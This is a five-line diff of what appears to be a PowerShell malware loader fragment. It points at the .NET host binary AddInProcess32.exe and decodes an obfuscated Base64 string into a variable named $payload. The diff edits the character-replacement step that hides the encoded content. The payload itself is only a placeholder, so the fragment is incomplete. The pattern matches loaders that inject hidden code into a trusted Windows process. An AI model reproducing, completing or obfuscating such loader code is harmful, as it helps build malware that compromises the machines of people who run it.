@@ -1,5 +1,5 @@
 $sysPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
-$Dot = '-'
+$Dot = '.'
 $Char = 'A'
 $mainEnc = '----'.Replace($Dot, $Char)
 $payload = [System.Convert]::FromBase64String($mainEnc)
